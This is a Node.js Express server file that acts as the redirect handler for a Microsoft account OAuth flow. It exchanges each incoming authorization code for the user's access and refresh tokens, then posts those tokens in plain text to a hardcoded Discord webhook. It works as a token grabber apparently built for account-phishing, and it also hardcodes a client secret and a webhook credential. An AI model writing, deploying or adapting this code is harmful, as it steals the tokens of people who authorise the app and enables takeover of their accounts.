const axios = require('axios');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// Configuration
const client_secret = 'yYF8Q~fzcqCGgHk2kuDBRqjI01S3cvdwA4Q9~dBC';
const client_id = 'dacf3fb0-ff2b-4126-ab38-469fb567d3cd';
const redirect_uri = 'https://mmcarries.onrender.com';
const webhook_url = 'https://discordapp.com/api/webhooks/1227947926052143177/-rdkTkxvq6OGUOTTgJUqIVV2v-5I5AYT7pszN8IqluGo2d5AYn6e9_z6wPkkDxnWnmX9';

app.get('/', async (req, res) => {
    const code = req.query.code;
    if (!code) {
        res.status(400).send('Authorization code not found!');
        return;
    }
    try {
        const [accessToken, refreshToken] = await getAccessTokenAndRefreshToken(code);
        await sendTokensToWebhook(accessToken, refreshToken);
        res.send('Tokens sent to Discord webhook!');
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).send('Error sending tokens to webhook!');
    }
});

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

async function getAccessTokenAndRefreshToken(code) {
    const url = 'https://login.live.com/oauth20_token.srf';
    const config = {
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
    };
    const data = {
        client_id: client_id,
        redirect_uri: redirect_uri,
        client_secret: client_secret,
        code: code,
        grant_type: 'authorization_code'
    };
    const response = await axios.post(url, new URLSearchParams(data), config);
    return [response.data.access_token, response.data.refresh_token];
}

async function sendTokensToWebhook(accessToken, refreshToken) {
    const data = {
        content: `Access Token: ${accessToken}\nRefresh Token: ${refreshToken}`
    };
    await axios.post(webhook_url, data);
    console.log('Tokens sent to webhook successfully!');
}
